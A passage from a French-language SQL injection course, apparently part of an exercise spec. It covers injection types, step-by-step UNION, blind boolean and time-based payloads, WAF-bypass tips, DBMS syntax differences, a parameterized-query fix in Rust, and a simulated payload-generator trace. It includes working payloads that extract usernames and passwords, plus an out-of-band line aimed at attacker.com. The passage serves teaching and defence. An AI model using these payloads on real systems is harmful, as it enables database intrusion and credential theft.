#### Types d'Injection SQL

```
                    SQL INJECTION TYPES
                           ‚îÇ
      ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
      ‚îÇ                    ‚îÇ                    ‚îÇ
  IN-BAND              INFERENTIAL          OUT-OF-BAND
(R√©sultat visible)    (R√©sultat d√©duit)    (Canal externe)
      ‚îÇ                    ‚îÇ                    ‚îÇ
  ‚îå‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îê            ‚îå‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îê               ‚îÇ
  ‚îÇ       ‚îÇ            ‚îÇ       ‚îÇ               ‚îÇ
UNION   ERROR       BOOLEAN  TIME          DNS/HTTP
BASED   BASED       BASED    BASED        EXFILTRATION

Exemples:
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
UNION:  ' UNION SELECT username,password FROM users--
ERROR:  ' AND 1=CONVERT(int,@@version)--
BOOL:   ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--
TIME:   ' AND SLEEP(5)--
OOB:    ' AND LOAD_FILE('\\\\attacker.com\\a')--
```

### 5.4 Les pi√®ges en d√©tail

| Pi√®ge | Description | Solution |
|-------|-------------|----------|
| **Quote mismatch** | Utiliser ' quand c'est " | Analyser la requ√™te source |
| **Column count** | ORDER BY donne une erreur | Binary search (ORDER BY 4, 2, 3...) |
| **DBMS syntax** | MySQL LIMIT vs Oracle ROWNUM | Adapter au DBMS |
| **Comment syntax** | `--` ne marche pas dans MySQL sans espace | Utiliser `-- -` ou `#` |
| **WAF blocks** | Mot-cl√© UNION bloqu√© | Case variation, comments |
| **NULL handling** | UNION avec types incompatibles | Utiliser NULL pour typage auto |

### 5.5 Cours Complet

#### 5.5.1 Histoire de l'Injection SQL

L'injection SQL a √©t√© document√©e pour la premi√®re fois en **1998** par Jeff Forristal. Malgr√© plus de 25 ans, elle reste la vuln√©rabilit√© #1 dans OWASP Top 10.

#### 5.5.2 Anatomie d'une Injection

```sql
-- Requ√™te originale
SELECT * FROM users WHERE username = '$user' AND password = '$pass'

-- Input malicieux
user = admin'--
pass = anything

-- Requ√™te r√©sultante
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
                                          ^
                                          |
                            Le -- commente le reste
```

#### 5.5.3 Techniques par Type

**UNION-Based** (In-Band)
```sql
-- √âtape 1: Trouver le nombre de colonnes
' ORDER BY 1-- (OK)
' ORDER BY 2-- (OK)
' ORDER BY 3-- (OK)
' ORDER BY 4-- (ERROR) ‚Üí 3 colonnes

-- √âtape 2: Trouver les colonnes string
' UNION SELECT NULL,NULL,NULL-- (OK)
' UNION SELECT 'a',NULL,NULL-- (Error si col 1 n'est pas string)
' UNION SELECT NULL,'a',NULL-- (OK ‚Üí col 2 est string)

-- √âtape 3: Extraire
' UNION SELECT NULL,username,password FROM users--
```

**Blind Boolean-Based** (Inferential)
```sql
-- Est-ce que l'admin existe?
' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 1/0 END FROM users)--

-- Si page normale ‚Üí TRUE
-- Si erreur/diff√©rent ‚Üí FALSE

-- Extraire char par char
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

**Time-Based** (Inferential)
```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)--

-- PostgreSQL
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
```

#### 5.5.4 Diff√©rences entre DBMS

| Feature | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---------|-------|------------|-------|--------|--------|
| **Comment** | `-- ` / `#` | `--` | `--` | `--` | `--` |
| **Concat** | `CONCAT()` | `||` | `+` | `||` | `||` |
| **Substring** | `SUBSTRING()` | `SUBSTRING()` | `SUBSTRING()` | `SUBSTR()` | `SUBSTR()` |
| **Sleep** | `SLEEP(n)` | `pg_sleep(n)` | `WAITFOR DELAY` | `DBMS_PIPE` | N/A |
| **Version** | `@@version` | `version()` | `@@version` | `v$version` | `sqlite_version()` |
| **System tables** | `information_schema` | `pg_catalog` | `sys.tables` | `all_tables` | `sqlite_master` |

### 5.6 Normes avec explications p√©dagogiques

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ ‚ùå HORS NORME (vuln√©rable)                                      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ let query = format!("SELECT * FROM users WHERE id = '{}'", id); ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ‚úÖ CONFORME (s√©curis√©)                                          ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ let stmt = conn.prepare("SELECT * FROM users WHERE id = $1")?;  ‚îÇ
‚îÇ let rows = stmt.query(&[&id])?;                                 ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ üìñ POURQUOI ?                                                   ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ ‚Ä¢ format!() concat√®ne directement l'input dans la requ√™te       ‚îÇ
‚îÇ ‚Ä¢ Un attaquant peut injecter du SQL arbitraire                  ‚îÇ
‚îÇ ‚Ä¢ prepare() s√©pare le code SQL des donn√©es                      ‚îÇ
‚îÇ ‚Ä¢ Le DBMS traite les param√®tres comme des DONN√âES, pas du CODE  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 5.7 Simulation avec trace d'ex√©cution

**Input:** `{"challenge_type":"UNION_BASED","vulnerable_query":"SELECT * FROM users WHERE id = '$id'","database":"MySQL","objective":"Extract users","constraints":{"max_payload_length":100,"blocked_keywords":[],"waf_level":0}}`

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ √âtape ‚îÇ Action                                                           ‚îÇ R√©sultat                               ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   1   ‚îÇ Validation input: non vide, non null                             ‚îÇ ‚úì OK                                   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   2   ‚îÇ Parse JSON ‚Üí SqlChallenge                                        ‚îÇ ‚úì challenge_type=UNION_BASED           ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   3   ‚îÇ Analyse query: contient '$id' avec quote                         ‚îÇ quote_type="single", param="$id"       ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   4   ‚îÇ Estimation colonnes: SELECT * ‚Üí default 4                        ‚îÇ column_count=4                         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   5   ‚îÇ G√©n√©ration payload UNION MySQL                                   ‚îÇ quote="'" + UNION SELECT               ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   6   ‚îÇ Assemblage: ' UNION SELECT NULL,username,password,NULL...        ‚îÇ payload complet                        ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   7   ‚îÇ WAF bypass: blocked_keywords=[] ‚Üí pas de bypass n√©cessaire       ‚îÇ payload inchang√©                       ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   8   ‚îÇ V√©rification longueur: 52 < 100                                  ‚îÇ ‚úì OK                                   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   9   ‚îÇ G√©n√©ration extraction_steps                                      ‚îÇ 5 √©tapes d√©taill√©es                    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  10   ‚îÇ G√©n√©ration remediation MySQL                                     ‚îÇ prepare() avec ? placeholder           ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  11   ‚îÇ G√©n√©ration metadata                                              ‚îÇ CVSS=9.8, severity=CRITICAL            ‚îÇ
